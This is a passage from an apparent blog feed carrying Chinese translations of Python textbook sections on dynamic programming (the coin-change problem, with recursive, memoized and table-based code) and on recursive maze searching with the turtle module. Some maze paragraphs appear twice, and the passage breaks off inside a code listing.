    <content type="html"><![CDATA[<p>计算机科学中的许多程序是为了优化一些值而编写的; 例如，找到两个点之间的最短路径，找到最适合一组点的线，或找到满足某些标准的最小对象集。计算机科学家使用许多策略来解决这些问题。本书的目标之一是向你展示几种不同的解决问题的策略。<code>动态规划</code> 是这些类型的优化问题的一个策略。<a id="more"></a></p><p>优化问题的典型例子包括使用最少的硬币找零。假设你是一个自动售货机制造商的程序员。你的公司希望通过给每个交易最少硬币来简化工作。假设客户放入 1 美元的钞票并购买 37 美分的商品。你可以用来找零的最小数量的硬币是多少？答案是六个硬币：两个 25 美分，一个 10美分 和 三个一美分。我们如何得到六个硬币的答案？我们从最大的硬币（25 美分）开始，并尽可能多，然后我们去找下一个小点的硬币，并尽可能多的使用它们。这第一种方法被称为贪婪方法，因为我们试图尽快解决尽可能大的问题。</p><p>让我们看一个方法，我们可以确定会找到问题的最佳答案。由于这一节是关于递归的，你可能已经猜到我们将使用递归解决方案。让我们从基本情况开始，如果我们可以与我们硬币的价值相同的金额找零，答案很容易，一个硬币。</p><p>如果金额不匹配，我们有几个选项。我们想要的是最低一个一分钱加上原始金额减去一分钱所需的硬币数量，或者一个 5 美分加上原始金额减去 5 美分所需的硬币数量，或者一个 10 美分加上原始金额减去 10 美分所需的硬币数量，等等。因此，需要对原始金额找零硬币数量可以根据下式计算：</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/assets/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.1.png" alt="image"></p><p>执行我们刚才描述的算法如 Listing 7 所示。在第 3 行，我们检查基本情况;也就是说，我们正试图支付硬币的确切金额。如果我们没有等于找零数量的硬币，我们递归调用每个小于找零额的不同的硬币值。第 6 行显示了我们如何使用列表推导将硬币列表过滤到小于当前找零的硬币列表。递归调用也减少了由所选硬币的值所需要的总找零量。递归调用在第 7 行。注意在同一行，我们将硬币数 <code>+1</code> ，以说明我们正在使用一个硬币的事实。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recMC</span><span class="params">(coinValueList,change)</span>:</span></div><div class="line">    minCoins=change</div><div class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c&lt;=change]:</div><div class="line">            numCoins=<span class="number">1</span>+recMC(coinValueList,change-i)</div><div class="line">            <span class="keyword">if</span> numCoins&lt;minCoins:</div><div class="line">                minCoins=numCoins</div><div class="line">    <span class="keyword">return</span> minCoins</div><div class="line">print(recMC([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">25</span>],<span class="number">63</span>))</div></pre></td></tr></table></figure><p><em>Listing 7</em></p><p>Listing 7 中的算法是非常低效的。事实上，它需要 <code>67,716,925</code> 个递归调用来找到 4 个硬币的最佳解决 63 美分问题的方案。要理解我们方法中的致命缺陷，请参见 Figure 5，其中显示了 377 个函数调用所需的一小部分，找到支付 26 美分的最佳硬币。</p><p>图中的每个节点对应于对 <code>recMC</code> 的调用。节点上的标签表示硬币数量的变化量。箭头上的标签表示我们刚刚使用的硬币。通过跟随图表，我们可以看到硬币的组合。主要的问题是我们重复做了太多的计算。例如，该图表示该算法重复计算了至少三次支付 15 美分。这些计算找到 15 美分的最佳硬币数量的步骤本身需要52个函数调用。显然，我们浪费了大量的时间和精力重新计算旧的结果。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/assets/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.figure5.png" alt="image"></p><p>减少我们工作量的关键是记住一些过去的结果，这样我们可以避免重新计算我们已经知道的结果。一个简单的解决方案是将最小数量的硬币的结果存储在表中。然后在计算新的最小值之前，我们首先检查表，看看结果是否已知。如果表中已有结果，我们使用表中的值，而不是重新计算。 ActiveCode 1 显示了一个修改的算法，以合并我们的表查找方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recDC</span><span class="params">(coinValueList,change,knownResults)</span>:</span></div><div class="line">    minCoins=change</div><div class="line">    <span class="keyword">if</span> change <span class="keyword">in</span> coinValueList:</div><div class="line">        knownResults[change]=<span class="number">1</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> knownResults[change]&gt;<span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> knownResults[change]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c&lt;=change]:</div><div class="line">            numCoins=<span class="number">1</span>+recDC(coinValueList,change-i,</div><div class="line">                             knownResults)</div><div class="line">            <span class="keyword">if</span> numCoins&lt;minCoins:</div><div class="line">                minCoins=numCoins</div><div class="line">                knownResults[change]=minCoins</div><div class="line">    <span class="keyword">return</span> minCoins</div><div class="line"></div><div class="line">print(recDC([<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">25</span>],<span class="number">63</span>,[<span class="number">0</span>]*<span class="number">64</span>))</div></pre></td></tr></table></figure><p><em>ActiveCode 1</em></p><p>注意，在第 6 行中，我们添加了一个测试，看看我们的列表是否包含此找零的最小硬币数量。如果没有，我们递归计算最小值，并将计算出的最小值存储在列表中。使用这个修改的算法减少了我们需要为四个硬币递归调用的数量，63美分问题只需 221 次调用！</p><p>虽然 AcitveCode 1 中的算法是正确的。事实上，我们所做的不是动态规划，而是我们通过使用称为 <code>记忆化</code>的技术来提高我们的程序的性能，或者更常见的叫做 <code>缓存</code>。</p><p>一个真正的动态编程算法将采取更系统的方法来解决这个问题。我们的动态编程解决方案将从找零一分钱开始，并系统地找到我们需要的找零额。这保证我们在算法的每一步，已经知道为任何更小的数量进行找零所需的最小硬币数量。</p><p>让我们看看如何找到 11 美分所需的最小找零数量。Figure 4 说明了该过程。我们从一分钱开始。唯一的解决方案是一个硬币（一分钱）。下一行显示一分和两分的最小值。再次，唯一的解决方案是两分钱。第五行事情变得有趣。现在我们有两个选择，五个一分钱或一个五分钱。我们如何决定哪个是最好的？我们查阅表，看到需要找零四美分的硬币数量是四，再加一个一分钱是五，等于五个硬币。或者我们可以尝试 0 分加一个五分，五分钱等于一个硬币。由于一和五最小的是一，我们在表中存储为一。再次快进到表的末尾，考虑 11 美分。Figure 5 展示了我们要考虑的三个选项：</p><ol><li>一个一分钱加上 <code>11-1 = 10分（1）</code> 的最小硬币数</li><li>一个五分钱加上 <code>11-5 = 6分（2）</code>的最小硬币数</li><li>一个十分钱加上 <code>11-10 = 1 分（1）</code>最小硬币数</li></ol><p>选项 1 或 3 总共需要两个硬币，这是 11 美分的最小硬币数。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/assets/4.12.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.figure6.png" alt="image"></p><p>Listing 8 用一个动态规划算法来解决我们的找零问题。 <code>dpMakeChange</code> 有三个参数：一个有效硬币值的列表，我们要求的找零额，以及一个包含每个值所需最小硬币数量的列表。 当函数完成时，<code>minCoins</code> 将包含从 0 到找零值的所有值的解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpMakeChange</span><span class="params">(coinValueList,change,minCoins)</span>:</span></div><div class="line">   <span class="keyword">for</span> cents <span class="keyword">in</span> range(change+<span class="number">1</span>):</div><div class="line">      coinCount = cents</div><div class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents]:</div><div class="line">            <span class="keyword">if</span> minCoins[cents-j] + <span class="number">1</span> &lt; coinCount:</div><div class="line">               coinCount = minCoins[cents-j]+<span class="number">1</span></div><div class="line">      minCoins[cents] = coinCount</div><div class="line">   <span class="keyword">return</span> minCoins[change]</div></pre></td></tr></table></figure><p><em>Listing 8</em></p><p>注意，<code>dpMakeChange</code> 不是递归函数，即使我们开始使用递归解决这个问题。重要的是要意识到，你可以为问题写一个递归解决方案但并不意味着它是最好的或最有效的解决方案。在这个函数中的大部分工作是通过从第 4 行开始的循环来完成的。在这个循环中，我们考虑使用所有可能的硬币对指定的金额进行找零。就像我们上面的 11 分的例子，我们记住最小值，并将其存储在我们的 <code>minCoins</code> 列表。</p><p>虽然我们的找零算法很好地找出最小数量的硬币，但它不帮助我们找零，因为我们不跟踪我们使用的硬币。我们可以轻松地扩展 <code>dpMakeChange</code> 来跟踪硬币使用，只需记住我们为每个条目添加的最后一个硬币到 <code>minCoins</code> 表。如果我们知道添加的最后一个硬币值，我们可以简单地减去硬币的值，在表中找到前一个条目，找到该金额的最后一个硬币。我们可以通过表继续跟踪，直到我们开始的位置。</p><p>ActiveCode 2 展示了 <code>dpMakeChange</code> 算法修改为跟踪使用的硬币，以及一个函数 <code>printCoins</code> 通过表打印出使用的每个硬币的值。前两行主要设置要找零的金额，并创建使用的硬币列表。 接下来的两行创建了我们需要存储结果的列表。<code>coinsUsed</code> 是用于找零的硬币的列表，并且 <code>coinCount</code> 是与列表中的位置相对应进行找零的最小硬币数。</p><p>注意，我们打印的硬币直接来自 <code>coinsUsed</code> 数组。对于第一次调用，我们从数组位置 <code>63</code> 开始，然后打印 <code>21</code>。然后我们取 <code>63-21 = 42</code>，看看列表的第 42 个元素。我们再次找到 21 存储在那里。 最后，数组第 21 个元素21 也包含 21，得到三个 21。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpMakeChange</span><span class="params">(coinValueList,change,minCoins,coinsUsed)</span>:</span></div><div class="line">   <span class="keyword">for</span> cents <span class="keyword">in</span> range(change+<span class="number">1</span>):</div><div class="line">      coinCount = cents</div><div class="line">      newCoin = <span class="number">1</span></div><div class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> coinValueList <span class="keyword">if</span> c &lt;= cents]:</div><div class="line">            <span class="keyword">if</span> minCoins[cents-j] + <span class="number">1</span> &lt; coinCount:</div><div class="line">               coinCount = minCoins[cents-j]+<span class="number">1</span></div><div class="line">               newCoin = j</div><div class="line">      minCoins[cents] = coinCount</div><div class="line">      coinsUsed[cents] = newCoin</div><div class="line">   <span class="keyword">return</span> minCoins[change]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printCoins</span><span class="params">(coinsUsed,change)</span>:</span></div><div class="line">   coin = change</div><div class="line">   <span class="keyword">while</span> coin &gt; <span class="number">0</span>:</div><div class="line">      thisCoin = coinsUsed[coin]</div><div class="line">      print(thisCoin)</div><div class="line">      coin = coin - thisCoin</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    amnt = <span class="number">63</span></div><div class="line">    clist = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">21</span>,<span class="number">25</span>]</div><div class="line">    coinsUsed = [<span class="number">0</span>]*(amnt+<span class="number">1</span>)</div><div class="line">    coinCount = [<span class="number">0</span>]*(amnt+<span class="number">1</span>)</div><div class="line"></div><div class="line">    print(<span class="string">"Making change for"</span>,amnt,<span class="string">"requires"</span>)</div><div class="line">    print(dpMakeChange(clist,amnt,coinCount,coinsUsed),<span class="string">"coins"</span>)</div><div class="line">    print(<span class="string">"They are:"</span>)</div><div class="line">    printCoins(coinsUsed,amnt)</div><div class="line">    print(<span class="string">"The used list is as follows:"</span>)</div><div class="line">    print(coinsUsed)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure><p><em>AcitveCode 2</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Making change <span class="keyword">for</span> <span class="number">63</span> requires</div><div class="line"><span class="number">3</span> coins</div><div class="line">They are:</div><div class="line"><span class="number">21</span></div><div class="line"><span class="number">21</span></div><div class="line"><span class="number">21</span></div><div class="line">The used list <span class="keyword">is</span> <span class="keyword">as</span> follows:</div><div class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">21</span>]</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;计算机科学中的许多程序是为了优化一些值而编写的; 例如，找到两个点之间的最短路径，找到最适合一组点的线，或找到满足某些标准的最小对象集。计算机科学家使用许多策略来解决这些问题。本书的目标之一是向你展示几种不同的解决问题的策略。&lt;code&gt;动态规划&lt;/code&gt; 是这些类型的优化问题的一个策略。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>探索迷宫</title>
    <link href="http://adamzeng.site/2017/11/05/%E6%8E%A2%E7%B4%A2%E8%BF%B7%E5%AE%AB/"/>
    <id>http://adamzeng.site/2017/11/05/探索迷宫/</id>
    <published>2017-11-05T02:16:22.000Z</published>
    <updated>2017-11-05T14:23:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="探索迷宫"><a href="#探索迷宫" class="headerlink" title="探索迷宫"></a>探索迷宫</h1><p>在这一节中，我们将讨论一个与扩展机器人世界相关的问题：你如何找到自己的迷宫？<a id="more"></a>如果你在你宿舍有一个扫地机器人（不是所有的大学生？）你希望你可以使用你在本节中学到的知识重新给它编程。我们要解决的问题是帮助我们的乌龟在虚拟迷宫中找到出路。迷宫问题的根源于希腊神话有关，传说忒修斯被送入迷宫中以杀死人身牛头怪。忒修斯用了一卷线帮助他找到回去的退路，当他完成杀死野兽的任务。在我们的问题中，我们将假设我们的乌龟在迷宫中间的某处，必须找到出路。看看Figure 2，了解我们将在本节中做什么。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.11.%E6%8E%A2%E7%B4%A2%E8%BF%B7%E5%AE%AB/assets/4.11.%E6%8E%A2%E7%B4%A2%E8%BF%B7%E5%AE%AB.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>为了使问题更容易些，我们假设我们的迷宫被分成“正方形”。迷宫的每个正方形是开放的或被一段墙壁占据。</p><p>乌龟只能通过迷宫的空心方块。 如果乌龟撞到墙上，它必须尝试不同的方向。乌龟将需要一个程序，以找到迷宫的出路。这里是过程：</p><ol><li>从我们的起始位置，我们将首先尝试向北一格，然后从那里递归地尝试我们的程序。</li><li>如果我们通过尝试向北作为第一步没有成功，我们将向南一格，并递归地重复我们的程序。</li><li>如果向南也不行，那么我们将尝试向西一格，并递归地重复我们的程序。</li><li>如果北，南和西都没有成功，则应用程序从当前位置递归向东。</li><li>如果这些方向都没有成功，那么没有办法离开迷宫，我们失败。</li></ol><p>现在，这听起来很容易，但有几个细节先谈谈。假设我们第一步是向北走。按照我们的程序，我们的下一步也将是向北。但如果北面被一堵墙阻挡，我们必须看看程序的下一步，并试着向南。不幸的是，向南使我们回到原来的起点。如果我们从那里再次应用递归过程，我们将又回到向北一格，并陷入无限循环。所以，我们必须有一个策略来记住我们去过哪。在这种情况下，我们假设有一袋面包屑可以撒在我们走过的路上。如果我们沿某个方向迈出一步，发现那个位置上已经有面包屑，我们应该立即后退并尝试程序中的下一个方向。我们看看这个算法的代码，就像从递归函数调用返回一样简单。</p><p>正如我们对所有递归算法所做的一样，让我们回顾一下基本情况。其中一些你可能已经根据前一段的描述猜到了。在这种算法中，有四种基本情况要考虑：</p><ol><li>乌龟撞到了墙。由于这一格被墙壁占据，不能进行进一步的探索。</li><li>乌龟找到一个已经探索过的格。我们不想继续从这个位置探索，否则会陷入循环。</li><li>我们发现了一个外边缘，没有被墙壁占据。换句话说，我们发现了迷宫的一个出口。</li><li>我们探索了一格在四个方向上都没有成功。</li></ol><p>为了我们的程序工作，我们将需要有一种方式来表示迷宫。为了使这个更有趣，我们将使用 <code>turtle</code> 模块来绘制和探索我们的迷宫，以使我们看到这个算法的功能。迷宫对象将提供以下方法让我们在编写搜索算法时使用：</p><ul><li><code>__init__</code> 读取迷宫的数据文件，初始化迷宫的内部表示，并找到乌龟的起始位置。</li><li><code>drawMaze</code> 在屏幕上的一个窗口中绘制迷宫。</li><li><code>updatePosition</code> 更新迷宫的内部表示，并更改窗口中乌龟的位置。</li><li><code>isExit</code> 检查当前位置是否是迷宫的退出位置。</li></ul><p>Maze 类还重载索引运算符 <code>[]</code> ，以便我们的算法可以轻松访问任何特定格的状态。</p><p>让我们来查看称为 <code>searchFrom</code> 的搜索函数的代码。代码如 Listing 3 所示。请注意，此函数需要三个参数：迷宫对象，起始行和起始列。 这很重要，因为作为递归函数，搜索在每次递归调用时开始。</p><p>乌龟只能通过迷宫的空心方块。 如果乌龟撞到墙上，它必须尝试不同的方向。乌龟将需要一个程序，以找到迷宫的出路。这里是过程：</p><ol><li>从我们的起始位置，我们将首先尝试向北一格，然后从那里递归地尝试我们的程序。</li><li>如果我们通过尝试向北作为第一步没有成功，我们将向南一格，并递归地重复我们的程序。</li><li>如果向南也不行，那么我们将尝试向西一格，并递归地重复我们的程序。</li><li>如果北，南和西都没有成功，则应用程序从当前位置递归向东。</li><li>如果这些方向都没有成功，那么没有办法离开迷宫，我们失败。</li></ol><p>现在，这听起来很容易，但有几个细节先谈谈。假设我们第一步是向北走。按照我们的程序，我们的下一步也将是向北。但如果北面被一堵墙阻挡，我们必须看看程序的下一步，并试着向南。不幸的是，向南使我们回到原来的起点。如果我们从那里再次应用递归过程，我们将又回到向北一格，并陷入无限循环。所以，我们必须有一个策略来记住我们去过哪。在这种情况下，我们假设有一袋面包屑可以撒在我们走过的路上。如果我们沿某个方向迈出一步，发现那个位置上已经有面包屑，我们应该立即后退并尝试程序中的下一个方向。我们看看这个算法的代码，就像从递归函数调用返回一样简单。</p><p>正如我们对所有递归算法所做的一样，让我们回顾一下基本情况。其中一些你可能已经根据前一段的描述猜到了。在这种算法中，有四种基本情况要考虑：</p><ol><li>乌龟撞到了墙。由于这一格被墙壁占据，不能进行进一步的探索。</li><li>乌龟找到一个已经探索过的格。我们不想继续从这个位置探索，否则会陷入循环。</li><li>我们发现了一个外边缘，没有被墙壁占据。换句话说，我们发现了迷宫的一个出口。</li><li>我们探索了一格在四个方向上都没有成功。</li></ol><p>为了我们的程序工作，我们将需要有一种方式来表示迷宫。为了使这个更有趣，我们将使用 <code>turtle</code> 模块来绘制和探索我们的迷宫，以使我们看到这个算法的功能。迷宫对象将提供以下方法让我们在编写搜索算法时使用：</p><ul><li><code>__init__</code> 读取迷宫的数据文件，初始化迷宫的内部表示，并找到乌龟的起始位置。</li><li><code>drawMaze</code> 在屏幕上的一个窗口中绘制迷宫。</li><li><code>updatePosition</code> 更新迷宫的内部表示，并更改窗口中乌龟的位置。</li><li><code>isExit</code> 检查当前位置是否是迷宫的退出位置。</li></ul><p>Maze 类还重载索引运算符 <code>[]</code> ，以便我们的算法可以轻松访问任何特定格的状态。</p><p>让我们来查看称为 <code>searchFrom</code> 的搜索函数的代码。代码如 Listing 3 所示。请注意，此函数需要三个参数：迷宫对象，起始行和起始列。 这很重要，因为作为递归函数，搜索在每次递归调用时开始。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchFrom</span><span class="params">(maze, startRow, startColumn)</span>:</span></div><div class="line">    maze.updatePosition(startRow, startColumn)</div><div class="line">   <span class="comment">#  Check for base cases:</span></div><div class="line">   <span class="comment">#  1. We have run into an obstacle, return false</span></div><div class="line">    <span class="keyword">if</span> maze[startRow][startColumn] == OBSTACLE :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="comment">#  2. We have found a square that has already been explored</span></div><div class="line">    <span class="keyword">if</span> maze[startRow][startColumn] == TRIED:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="comment"># 3. Success, an outside edge not occupied by an obstacle</span></div><div class="line">    <span class="keyword">if</span> maze.isExit(startRow,startColumn):</div><div class="line">        maze.updatePosition(startRow, startColumn, PART_OF_PATH)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    maze.updatePosition(startRow, startColumn, TRIED)</div><div class="line"></div><div class="line">    <span class="comment"># Otherwise, use logical short circuiting to try each</span></div><div class="line">    <span class="comment"># direction in turn (if needed)</span></div><div class="line">    found = searchFrom(maze, startRow<span class="number">-1</span>, startColumn) <span class="keyword">or</span> \</div><div class="line">            searchFrom(maze, startRow+<span class="number">1</span>, startColumn) <span class="keyword">or</span> \</div><div class="line">            searchFrom(maze, startRow, startColumn<span class="number">-1</span>) <span class="keyword">or</span> \</div><div class="line">            searchFrom(maze, startRow, startColumn+<span class="number">1</span>)</div><div class="line">    <span class="keyword">if</span> found:</div><div class="line">        maze.updatePosition(startRow, startColumn, PART_OF_PATH)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        maze.updatePosition(startRow, startColumn, DEAD_END)</div><div class="line">    <span class="keyword">return</span> found</div></pre></td></tr></table></figure><p><em>Listing 3</em></p><p>你会看到代码的第一行（行 2）调用 <code>updatePosition</code>。这只是为了可视化算法，以便你可以看到乌龟如何探索通过迷宫。接下来算法检查四种基本情况中的前三种：乌龟是否碰到墙（行 5）？乌龟是否回到已经探索过的格子（行 8）？乌龟有没有到达出口（行 11）？如果这些条件都不为真，则我们继续递归搜索。</p><p>你会注意到，在递归步骤中有四个对 <code>searchFrom</code> 的递归调用。很难预测将有多少个递归调用，因为它们都由 <code>or</code> 语句连接。如果对 <code>searchFrom</code> 的第一次调用返回 <code>True</code> ，则不需要最后三个调用。你可以理解这一步向 <code>(row-1,column)</code>（或北，如果你从地理位置上思考）是在迷宫的路径上。如果没有一个好的路径向北，那么尝试下一个向南的递归调用。如果向南失败，然后尝试向西，最后向东。如果所有四个递归调用返回 <code>False</code>，那么认为是一个死胡同。你应该下载或输入整个程序，并通过更改这些调用的顺序进行实验。</p><p><code>Maze</code> 类的代码如 Listing 4，Listing 5 和 Listing 6 所示。<code>__init__</code> 方法将文件的名称作为其唯一参数。此文件是一个文本文件，通过使用 <code>+</code> 字符表示墙壁，空格表示空心方块，并使用字母 <code>S</code> 表示起始位置。Figure 3 是迷宫数据文件的示例。迷宫的内部表示是列表的列表。 <code>mazelist</code> 实例变量的每一行也是一个列表。此辅助列表使用上述字符，每格表示一个字符。Figure 3 中的数据文件，内部表示如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[ [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">' '</span>,...,<span class="string">' '</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">' '</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>],</div><div class="line">  [<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,<span class="string">'+'</span>,...,<span class="string">'+'</span>,<span class="string">'+'</span>,<span 